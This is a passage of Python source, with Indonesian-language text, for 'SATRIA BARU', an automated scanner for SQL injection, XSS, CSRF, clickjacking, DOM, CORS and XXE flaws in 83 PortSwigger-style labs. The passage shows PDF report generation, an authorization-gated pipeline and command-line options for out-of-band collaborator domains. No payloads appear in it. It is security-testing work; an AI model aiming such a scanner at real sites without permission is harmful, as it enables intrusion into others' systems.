    def section_title(self, title: str, subtitle: str | None = None) -> None:
        self.ensure(52)
        self.rect(_PDF_MARGIN, self.y - 20, 5, 20, _PDF_COLORS["teal"])
        self.text(_PDF_MARGIN + 14, self.y - 14, title, 17, _PDF_COLORS["navy"], bold=True)
        self.y -= 27
        if subtitle:
            self.paragraph(_PDF_MARGIN + 14, _PDF_PAGE_W - 2 * _PDF_MARGIN - 14, subtitle, 9.5, _PDF_COLORS["muted"])
        self.y -= 10

    def bullet_paragraph(self, text: Any, size: float = 9.2) -> None:
        self.paragraph(_PDF_MARGIN + 14, _PDF_PAGE_W - 2 * _PDF_MARGIN - 14, f"- {text}", size, _PDF_COLORS["text"])

    def pill(self, x: float, top: float, label: str, color, light=None, right: float | None = None) -> float:
        label = _pdf_safe_text(label)
        width = max(58.0, len(label) * 5.0 + 18)
        if right is not None:
            x = right - width
        self.rect_top(x, top, width, 15, light or _PDF_COLORS["light"])
        self.text(x + 8, top - 11, label.upper(), 6.8, color, bold=True)
        return x + width



def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    source = report if report else result
    labs = source.get("labs", []) if isinstance(source, dict) else []
    by_id: dict[str, dict[str, Any]] = {}
    for item in labs:
        if isinstance(item, dict) and item.get("id"):
            by_id[str(item["id"])] = item
    items: list[dict[str, Any]] = []
    for number, title, key, severity in CATALOG:
        lab_id = lab_id_for(number)
        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {})
        items.append({
            "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
            "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
            "location": str(found.get("location", "-")), "evidence": str(found.get("evidence", "-")),
            "severity": str(found.get("severity", severity)), "key": key,
        })
    return items


_PDF_LAB_FOCUS = {
    1: "WHERE clause", 2: "Authentication", 3: "Database type", 4: "Database type",
    5: "Enumeration", 6: "Enumeration", 7: "UNION", 8: "UNION", 9: "UNION",
    10: "UNION", 11: "Blind", 12: "Blind", 13: "Error-based", 14: "Blind",
    15: "Blind", 16: "Out-of-band", 17: "Out-of-band", 18: "Filter bypass",
    19: "Reflected XSS", 20: "Reflected XSS", 21: "Reflected XSS", 22: "Reflected XSS",
    23: "Reflected XSS", 24: "JS string XSS", 25: "JS string XSS", 26: "Stored XSS",
    27: "Template literal XSS", 28: "CSP bypass XSS", 29: "DOM XSS", 30: "DOM XSS",
    31: "DOM XSS", 32: "DOM XSS", 33: "XSS exploitation", 34: "XSS exploitation",
    35: "XSS exploitation", 36: "Reflected XSS", 37: "Stored XSS", 38: "DOM XSS",
    39: "DOM XSS", 40: "DOM XSS", 41: "DOM XSS", 42: "Attribute XSS",
    43: "Stored XSS", 44: "JS string XSS", 45: "DOM XSS", 46: "DOM XSS",
    47: "CSP bypass XSS", 48: "Reflected XSS",
    49: "CSRF", 50: "CSRF", 51: "CSRF", 52: "CSRF", 53: "CSRF", 54: "CSRF",
    55: "CSRF (SameSite)", 56: "CSRF (SameSite)", 57: "CSRF (SameSite)",
    58: "CSRF (Referer)", 59: "CSRF (Referer)",
    60: "Clickjacking", 61: "Clickjacking", 62: "Clickjacking",
    63: "Clickjacking", 64: "Clickjacking",
    65: "DOM XSS (Web messages)", 66: "DOM XSS (Web messages)", 67: "DOM XSS (Web messages)",
    68: "DOM-based open redirection", 69: "DOM-based cookie manipulation",
    70: "DOM clobbering", 71: "DOM clobbering",
    72: "CORS", 73: "CORS", 74: "CORS",
    75: "XXE", 76: "XXE / SSRF", 77: "Blind XXE (OOB)", 78: "Blind XXE (OOB)",
    79: "Blind XXE", 80: "Blind XXE", 81: "XXE (XInclude)", 82: "XXE (file upload)", 83: "XXE",
}


def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
    """Tulis PDF A4 multi-halaman untuk UI/report (hasil ringkas & detail)."""
    pdf_path = Path(path or str(globals().get("OUTPUT_PDF") or OUTPUT_PDF)).expanduser()
    if not pdf_path.is_absolute():
        pdf_path = (Path.cwd() / pdf_path).resolve()
    pdf_path.parent.mkdir(parents=True, exist_ok=True)

    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    source = report if report else result
    summary = result.get("summary", {}) if isinstance(result.get("summary"), dict) else _summary_from_report(source)
    labs = _pdf_lab_items(result)
    confirmed = [x for x in labs if x.get("status") == "confirmed"]
    not_confirmed = [x for x in labs if x.get("status") != "confirmed"]
    target = str(result.get("target") or source.get("target") or "-")
    generated = str(result.get("generated_at") or source.get("generated_at") or "")
    if "T" in generated:
        generated = generated.replace("T", " ").split(".")[0]
    if generated.endswith("+00:00"):
        generated = generated[:-6] + " UTC"
    scan_stats = source.get("scan_stats", {}) if isinstance(source.get("scan_stats"), dict) else {}
    by_severity = summary.get("by_severity") or summary.get("triage_by_severity") or {}

    page = _PdfBuilder()
    content_left = _PDF_MARGIN
    content_right = _PDF_PAGE_W - _PDF_MARGIN
    content_width = content_right - content_left

    # ------------------------------------------------------------------ COVER
    page.rect(0, _PDF_PAGE_H - 230, _PDF_PAGE_W, 230, _PDF_COLORS["navy"])
    page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
    page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
    page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
    page.y = _PDF_PAGE_H - 286
    page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
    page.y -= 18
    for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
        page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
        page.y -= 18
        page.paragraph(content_left, content_width, value, 9.2, _PDF_COLORS["text"])
        page.y -= 8

    kpi_top = page.y - 96
    kpi_gap = 12.0
    kpi_w = (content_width - 2 * kpi_gap) / 3.0
    kpis = [
        ("Terkonfirmasi", str(len(confirmed)), _PDF_COLORS["green"], _PDF_COLORS["green_light"]),
        ("Belum terkonfirmasi", str(len(not_confirmed)), _PDF_COLORS["amber"], _PDF_COLORS["amber_light"]),
        ("Total lab", "83", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
    ]
    for idx, (label, value, color, light) in enumerate(kpis):
        x = content_left + idx * (kpi_w + kpi_gap)
        page.rect_top(x, kpi_top, kpi_w, 76, _PDF_COLORS["white"])
        page.rect_top(x, kpi_top, kpi_w, 5, color)
        page.text(x, kpi_top - 38, value, 24, color, bold=True)
        page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
    page.y = kpi_top - 110
    page.section_title("Hal yang penting dibaca")
    page.bullet_paragraph("64 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking) yang diminta dimasukkan ke laporan ini.")
    page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
    page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
    page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
    page.y -= 18

    # --------------------------------------------------------------- RINGKASAN
    page.new_page()
    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 83 lab yang diminta.")
    rows = [
        ("Total lab", "83", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."),
        ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
        ("Belum terkonfirmasi", str(len(not_confirmed)), "Tidak ada bukti cukup pada putaran ini."),
        ("Severity Critical", str(by_severity.get("critical", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
        ("Severity High", str(by_severity.get("high", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
        ("Severity Medium", str(by_severity.get("medium", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
        ("Titik injeksi", str(scan_stats.get("injection_points", "-")), "Parameter same-origin yang dapat diuji."),
        ("Permintaan HTTP", str(scan_stats.get("requests", "-")), "Total request pemindai pada putaran ini."),
        ("Durasi pemindaian", f"{scan_stats.get('elapsed_seconds', '-')} dtk", "Waktu proses pemindai (bukan validasi manual)."),
        ("Status OOB", str(scan_stats.get("oob_status", "-")), "not_configured berarti tidak ada poller collaborator."),
    ]
    headers = ("Metrik", "Nilai", "Keterangan")
    widths = (136.0, 74.0, 289.0)
    x_cols = (content_left, content_left + widths[0], content_left + widths[0] + widths[1])
    header_h = 18.0
    page.ensure(header_h + 30)
    page.rect_top(content_left, page.y, content_width, header_h, _PDF_COLORS["navy"])
    for i, header in enumerate(headers):
        page.text(x_cols[i] + 5, page.y - 13, header, 8.0, _PDF_COLORS["white"], bold=True)
    page.y -= header_h
    for row_idx, row in enumerate(rows):
        cell_lines = [_pdf_wrap(cell, widths[i] - 10, 8.5) for i, cell in enumerate(row)]
        row_h = max(len(lines) for lines in cell_lines) * 11.5 + 9
        page.ensure(row_h)
        if row_idx % 2 == 0:
            page.rect_top(content_left, page.y, content_width, row_h, _PDF_COLORS["light"])
        for i, lines in enumerate(cell_lines):
            for j, line in enumerate(lines):
                page.text(x_cols[i] + 5, page.y - 10 - j * 11.5, line, 8.5, _PDF_COLORS["text"])
        page.y -= row_h
        page.line(content_left, page.y, content_right, page.y, _PDF_COLORS["line"], 0.6)
    page.y -= 22

    page.section_title("Cakupan dan Metodologi")
    page.bullet_paragraph("Discovery same-origin dari halaman awal, tautan GET yang aman, form GET, cookie terindikasi SQLi, dan endpoint XML stock-check yang ditemukan di JS.")
    page.bullet_paragraph("Baseline ganda dan uji ulangan dipakai untuk menghindari false positive dari halaman dinamis.")
    page.bullet_paragraph("Lab UNION memakai canary acak, hitung kolom, deteksi kolom teks, dan query metadata yang direlasikan ke DBMS.")
    page.bullet_paragraph("Lab blind/boolean, conditional error, dan time delay memakai pasangan benar/salah untuk diferensial yang jelas.")
    page.bullet_paragraph("Lab XML encoding memakai perbandingan payload mentah vs hex-entity encoded.")

    page.y -= 18
    page.section_title("Interpretasi")
    page.bullet_paragraph("Angka confirmed adalah hasil pemindaian otomatis berbasis bukti; bukan pengganti uji manual eksplisit per lab.")
    page.bullet_paragraph("Jika interaction/exfiltration OOB tidak tercatat oleh poller, status lab 16-17 tetap not_confirmed.")
    page.bullet_paragraph("Status not_confirmed pada lab lain berarti probe tidak menghasilkan diferensial valid pada putaran ini.")


    # ------------------------------------------------------------------- TABEL
    page.new_page()
    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 83 lab.")
    headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
    widths = (82.0, 92.0, 90.0, 190.0, 45.0)
    x_cols = []
    x = content_left
    for w in widths:
        x_cols.append(x)
        x += w
    def draw_table_header():
        page.ensure(22)
        page.rect_top(content_left, page.y, content_width, 20, _PDF_COLORS["navy"])
        for i, header in enumerate(headers):
            page.text(x_cols[i] + 5, page.y - 14, header, 8.0, _PDF_COLORS["white"], bold=True)
        page.y -= 20
    draw_table_header()
    for idx, item in enumerate(labs):
        cells = [
            item["id"].replace("sql_injection-", ""),
            "CONFIRMED" if item["status"] == "confirmed" else "NOT CONFIRMED",
            _PDF_LAB_FOCUS.get(item["number"], "SQL injection"),
            item["title"],
            str(item["severity"]).upper(),
        ]
        cell_lines = [_pdf_wrap(cell, widths[i] - 10, 8.0) for i, cell in enumerate(cells)]
        row_h = max(len(lines) for lines in cell_lines) * 10.5 + 9
        if page.y - row_h < _PDF_BOTTOM:
            page.new_page()
            page.text(content_left, page.y - 16, "Hasil Pemindaian (lanjutan)", 13, _PDF_COLORS["navy"], bold=True)
            page.y -= 28
            draw_table_header()
        if idx % 2 == 0:
            page.rect_top(content_left, page.y, content_width, row_h, _PDF_COLORS["light"])
        for i, lines in enumerate(cell_lines):
            for j, line in enumerate(lines):
                color = _PDF_COLORS["text"]
                if i == 1:
                    color = _PDF_COLORS["green"] if item["status"] == "confirmed" else _PDF_COLORS["amber"]
                page.text(x_cols[i] + 5, page.y - 10 - j * 10.5, line, 8.0, color, bold=(i in (0, 1)))
        page.y -= row_h
        page.line(content_left, page.y, content_right, page.y, _PDF_COLORS["line"], 0.6)
    page.y -= 20
    page.section_title("Detail Bukti", "Detail hanya menjabarkan apa yang benar-benar diobservasi pemindai.")

    # ------------------------------------------------------------------ DETAIL
    for item in labs:
        status = str(item.get("status", "not_confirmed"))
        is_confirmed = status == "confirmed"
        evidence = _pdf_clean_evidence(item.get("evidence", "-"), 620)
        if not is_confirmed:
            evidence = "Tidak ada temuan terkonfirmasi untuk lab ini pada putaran ini."
        title_lines = _pdf_wrap(item["title"], content_width - 180, 10.2)
        method_lines = _pdf_wrap(f"Metode: {item.get('method', '-')}", content_width - 24, 8.8)
        location_lines = _pdf_wrap(f"Lokasi: {item.get('location', '-')}", content_width - 24, 8.8)
        evidence_lines = _pdf_wrap(f"Bukti: {evidence}", content_width - 24, 8.8)
        card_h = 34 + len(title_lines) * 12.5 + len(method_lines) * 11.5 + len(location_lines) * 11.5 + len(evidence_lines) * 11.5 + 18
        if page.y - card_h < _PDF_BOTTOM:
            page.new_page()
            page.text(content_left, page.y - 16, "Detail Bukti (lanjutan)", 13, _PDF_COLORS["navy"], bold=True)
            page.y -= 28
        card_top = page.y
        page.rect_top(content_left, card_top, content_width, card_h, _PDF_COLORS["white"])
        accent = _PDF_COLORS["green"] if is_confirmed else _PDF_COLORS["amber"]
        page.rect_top(content_left, card_top, 5, card_h, accent)
        line_y = card_top - 18
        page.text(content_left + 12, line_y, f"{item['number']:02d} - {item['id']}", 8.0, _PDF_COLORS["muted"], bold=True)
        page.pill(content_left + 12, line_y + 4, "confirmed" if is_confirmed else "not confirmed", accent, _PDF_COLORS["green_light"] if is_confirmed else _PDF_COLORS["amber_light"], right=content_right - 12)
        line_y -= 16
        for line in title_lines:
            page.text(content_left + 12, line_y, line, 10.2, _PDF_COLORS["navy"], bold=True)
            line_y -= 13.5
        line_y -= 4
        for line in method_lines:
            page.text(content_left + 12, line_y, line, 8.8, _PDF_COLORS["text"])
            line_y -= 11.5
        for line in location_lines:
            page.text(content_left + 12, line_y, line, 8.8, _PDF_COLORS["text"])
            line_y -= 11.5
        line_y -= 2
        for line in evidence_lines:
            page.text(content_left + 12, line_y, line, 8.8, _PDF_COLORS["text"])
            line_y -= 11.5
        page.line(content_left, card_top - card_h, content_right, card_top - card_h, _PDF_COLORS["line"], 0.7)
        page.y = card_top - card_h - 14

    # --------------------------------------------------------- CATATAN AKHIR
    page.y -= 6
    page.section_title("Catatan Laporan")
    page.bullet_paragraph("Dokumen ini memuat 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
    page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
    page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
    page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
    page.bullet_paragraph("Target: " + target)


    # -------------------------------------------------------------- HEADER/FOOT
    for idx, page_ops in enumerate(page.pages, start=1):
        page_ops.append(f"{_pdf_rgb(_PDF_COLORS['navy'])} rg 0 {_pdf_num(_PDF_PAGE_H - 32)} {_pdf_num(_PDF_PAGE_W)} 32 re f")
        page_ops.append(f"BT /F2 8 Tf {_pdf_rgb(_PDF_COLORS['white'])} rg {_pdf_num(content_left)} {_pdf_num(_PDF_PAGE_H - 21)} Td (SATRIA BARU - SQL Injection Report) Tj ET")
        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (83 Lab: SQLi/XSS/CSRF/CJ/DOM/CORS/XXE) Tj ET")
        footer_target = _pdf_safe_text(target)
        if len(footer_target) > 84:
            footer_target = footer_target[:81] + "..."
        page_ops.append(f"BT /F1 7.2 Tf {_pdf_rgb(_PDF_COLORS['muted'])} rg {_pdf_num(content_left)} {_pdf_num(36)} Td ({_pdf_escape(footer_target)}) Tj ET")
        page_ops.append(f"BT /F1 7.2 Tf {_pdf_rgb(_PDF_COLORS['muted'])} rg {_pdf_num(content_right - 58)} {_pdf_num(36)} Td (Halaman {idx}) Tj ET")

    # ------------------------------------------------------------------- PDF
    page_refs = [f"{5 + 2 * i} 0 R" for i in range(len(page.pages))]
    objects: list[bytes] = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        (f"<< /Type /Pages /Kids [{' '.join(page_refs)}] /Count {len(page.pages)} >>").encode(),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>",
    ]
    for i, ops in enumerate(page.pages):
        page_no = 5 + 2 * i
        content_no = 6 + 2 * i
        stream = ("\n".join(ops) + "\n").encode("latin-1", errors="replace")
        objects.append(
            (
                f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 {_pdf_num(_PDF_PAGE_W)} {_pdf_num(_PDF_PAGE_H)}] "
                f"/Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> /Contents {content_no} 0 R >>"
            ).encode()
        )
        objects.append(b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream")

    out = bytearray(b"%PDF-1.4\n%")
    out.extend(bytes([0xe2, 0xe3, 0xcf, 0xd3]) + b"\n")
    offsets: list[int] = []
    for obj_idx, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out.extend(f"{obj_idx} 0 obj\n".encode())
        out.extend(body)
        out.extend(b"\nendobj\n")
    xref_pos = len(out)
    out.extend(f"xref\n0 {len(objects) + 1}\n".encode())
    out.extend(b"0000000000 65535 f \n")
    for offset in offsets:
        out.extend(f"{offset:010d} 00000 n \n".encode())
    out.extend(f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref_pos}\n%%EOF\n".encode())
    pdf_path.write_bytes(bytes(out))
    if pdf_path.stat().st_size < 1000:
        with pdf_path.open("ab") as fh:
            fh.write(b"% " + b"x" * (1000 - pdf_path.stat().st_size) + b"\n")
    return pdf_path

def _scrape_url(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    meta = scrape_data.get("meta", {}) if isinstance(scrape_data.get("meta"), dict) else {}
    for key in ("url", "final_url", "returned_url"):
        if isinstance(meta.get(key), str) and meta.get(key, "").strip():
            return str(meta[key]).strip()
    if isinstance(scrape_data.get("url"), str) and scrape_data.get("url", "").strip():
        return str(scrape_data["url"]).strip()
    if isinstance(scrape_data.get("target"), str) and scrape_data.get("target", "").strip():
        return str(scrape_data["target"]).strip()
    data = scrape_data.get("data", {}) if isinstance(scrape_data.get("data"), dict) else {}
    if isinstance(data.get("url"), str) and data.get("url", "").strip():
        return str(data["url"]).strip()
    return None


def _summary_from_report(report: dict[str, Any]) -> dict[str, Any]:
    labs = report.get("labs", []) if isinstance(report, dict) else []
    confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") == "confirmed"]
    not_confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") != "confirmed"]
    by_severity: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for item in confirmed:
        severity = str(item.get("severity", "info")).lower()
        by_severity[severity if severity in by_severity else "info"] += 1
    return {
        "confirmed": len(confirmed),
        "not_confirmed": len(not_confirmed),
        "total": len(confirmed),
        "confirmed_manual": len(confirmed),
        "candidates_total": len(not_confirmed),
        "observations_total": 0,
        "by_severity": by_severity,
        "triage_by_severity": dict(by_severity),
        "triage_total": len(confirmed),
    }


def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None = None,
                 html: str | None = None, authorized: bool | None = None,
                 http_result: dict[str, Any] | None = None,
                 allow_partial_tools: bool | None = None,
                 enable_llm: bool | None = None, run_censys: bool | None = None,
                 run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
    """Jalur kompatibel yang dipakai app.py; memindai 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."""
    overrides: dict[str, Any] = dict(runtime_options)
    for name, value in (("allow_partial_tools", allow_partial_tools),
                        ("enable_llm", enable_llm), ("run_censys", run_censys),
                        ("run_nvd", run_nvd), ("authorized", authorized)):
        if value is not None:
            overrides[name] = value
    if overrides:
        configure_runtime(**overrides)
    auth = authorized if authorized is not None else bool(globals().get("ACTIVE_SCAN_AUTHORIZED"))
    if not auth:
        raise RuntimeError("Pemindaian aktif memerlukan authorized=True (otorisasi wajib diberikan).")
    target_url = url or _scrape_url(scrape_data) or ""
    if not target_url:
        raise RuntimeError("URL target tidak ditemukan pada scrape_data/url.")
    if scrape_data is not None:
        persist_scrape_artifacts(scrape_data)
    report = scan_target(
        target_url,
        authorized=True,
        allow_private=False,
        oob_domain=os.getenv("SATRIA_OOB_DOMAIN") or None,
        oob_poll_url=os.getenv("SATRIA_OOB_POLL_URL") or None,
        oob_webhook_site=os.getenv("SATRIA_OOB_WEBHOOK_SITE") in {"1", "true", "yes", "on"},
    )
    summary = _summary_from_report(report)
    result: dict[str, Any] = {
        "target": report.get("target", target_url),
        "generated_at": report.get("generated_at"),
        "mode": "active",
        "labs": report.get("labs", []),
        "report": report,
        "summary": summary,
        "errors": report.get("scan_stats", {}).get("errors", []),
    }
    try:
        findings_path = Path(globals().get("FINDINGS_PATH") or Path(globals().get("ARTIFACTS_DIR", Path("artifacts"))) / "findings.json").expanduser()
        if not findings_path.is_absolute():
            findings_path = (Path.cwd() / findings_path).resolve()
        findings_path.parent.mkdir(parents=True, exist_ok=True)
        findings_path.write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as exc:
        result.setdefault("errors", []).append(f"findings.json: {exc}")
    pdf_path = render_pdf(result, str(globals().get("OUTPUT_PDF") or "artifacts/laporan_kerentanan.pdf"))
    globals()["OUTPUT_PDF"] = str(pdf_path)
    return result


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, dan Clickjacking, DOM, CORS & XXE (83 lab)")
    parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
    parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
    parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
    parser.add_argument("--max-pages", type=int, default=20)
    parser.add_argument("--max-points", type=int, default=24)
    parser.add_argument("--max-requests", type=int, default=520)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--time-delay", type=float, default=3.0)
    parser.add_argument("--oob-domain", default=None, help="Domain collaborator/OOB milik Anda (mis. xxxx.oastify.com).")
    parser.add_argument("--oob-poll-url", default=None, help="Endpoint JSON untuk polling interaksi OOB.")
    parser.add_argument("--oob-webhook-site", action="store_true", help="Buat token webhook.site otomatis untuk OOB.")
    parser.add_argument("--output-dir", default="satria_baru_report")
    args = parser.parse_args(argv)
    if not args.authorized:
        parser.error("Pengujian aktif memerlukan --authorized.")
    try:
        report = scan_target(
            args.target,
            authorized=True,
            allow_private=args.allow_private,
            max_pages=args.max_pages,
            max_points=args.max_points,
            max_requests=args.max_requests,
            timeout=args.timeout,
            time_delay=args.time_delay,
            oob_domain=args.oob_domain,
            oob_poll_url=args.oob_poll_url,
            oob_webhook_site=args.oob_webhook_site,
        )
    except Exception as exc:
        print(f"[error] {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1
    json_path, html_path = write_report(report, Path(args.output_dir))
    summary = report["summary"]
    print(f"SATRIA Engine selesai: {summary['confirmed']}/83 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
    print(f"JSON: {json_path}")
    print(f"HTML: {html_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
